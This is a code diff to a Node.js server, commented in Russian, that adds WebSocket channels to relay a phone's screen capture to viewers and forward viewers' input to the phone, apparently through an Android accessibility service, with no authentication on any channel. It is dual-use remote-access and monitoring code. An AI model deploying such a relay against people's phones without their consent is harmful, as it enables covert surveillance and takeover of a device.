@@ -255,11 +255,11 @@ app.get('/api/build/github/artifact', h(async (req, res) => {
 
 // ---- Сервер + WebSocket ----
 const server = http.createServer(app);
-// Два WebSocket-канала на одном сервере: /ws (управление панелью) и
-// /camera (поток камеры телефона: role=phone публикует, role=viewer смотрит).
 const wss = new WebSocketServer({ noServer: true });
 const wssCamera = new WebSocketServer({ noServer: true });
 const wssAudio = new WebSocketServer({ noServer: true });
+const wssScreen = new WebSocketServer({ noServer: true });
+const wssControl = new WebSocketServer({ noServer: true });
 
 server.on('upgrade', (req, socket, head) => {
   const { pathname } = new URL(req.url, 'http://localhost');
@@ -270,6 +270,10 @@ server.on('upgrade', (req, socket, head) => {
     wssCamera.handleUpgrade(req, socket, head, (ws) => wssCamera.emit('connection', ws, req));
   } else if (pathname === '/audio') {
     wssAudio.handleUpgrade(req, socket, head, (ws) => wssAudio.emit('connection', ws, req));
+  } else if (pathname === '/screen') {
+    wssScreen.handleUpgrade(req, socket, head, (ws) => wssScreen.emit('connection', ws, req));
+  } else if (pathname === '/control') {
+    wssControl.handleUpgrade(req, socket, head, (ws) => wssControl.emit('connection', ws, req));
   } else {
     socket.destroy();
   }
@@ -478,6 +482,53 @@ wss.on('connection', (ws) => {
   });
 
   ws.on('close', () => { streaming = false; });
+});
+
+// ---- Экран телефона (MediaProjection) ----
+const screenPhones = new Map(); // ip → ws
+const screenViewers = new Set();
+
+wssScreen.on('connection', (ws, req) => {
+  const params = new URL(req.url, 'http://localhost').searchParams;
+  const role = params.get('role') || 'viewer';
+  const ip = req.socket.remoteAddress;
+  console.log(`[SCREEN] connected: role=${role} from ${ip}`);
+
+  if (role === 'phone') {
+    screenPhones.set(ip, ws);
+    ws.on('message', (data, isBinary) => {
+      if (isBinary && ip === activePhoneIp) {
+        for (const v of screenViewers) if (v.readyState === v.OPEN) v.send(data, { binary: true });
+      }
+    });
+    ws.on('close', () => { if (screenPhones.get(ip) === ws) screenPhones.delete(ip); });
+  } else {
+    screenViewers.add(ws);
+    ws.on('close', () => screenViewers.delete(ws));
+  }
+});
+
+// ---- Управление телефоном (AccessibilityService) ----
+const controlPhones = new Map(); // ip → ws
+const controlViewers = new Set();
+
+wssControl.on('connection', (ws, req) => {
+  const params = new URL(req.url, 'http://localhost').searchParams;
+  const role = params.get('role') || 'viewer';
+  const ip = req.socket.remoteAddress;
+  console.log(`[CTRL] connected: role=${role} from ${ip}`);
+
+  if (role === 'phone') {
+    controlPhones.set(ip, ws);
+    ws.on('close', () => { if (controlPhones.get(ip) === ws) controlPhones.delete(ip); });
+  } else {
+    controlViewers.add(ws);
+    ws.on('message', (data) => {
+      const phone = activePhoneIp ? controlPhones.get(activePhoneIp) : null;
+      if (phone && phone.readyState === phone.OPEN) phone.send(data);
+    });
+    ws.on('close', () => controlViewers.delete(ws));
+  }
 });
 
 // Запуск сервера. Возвращает { server, port } — используется как из CLI,
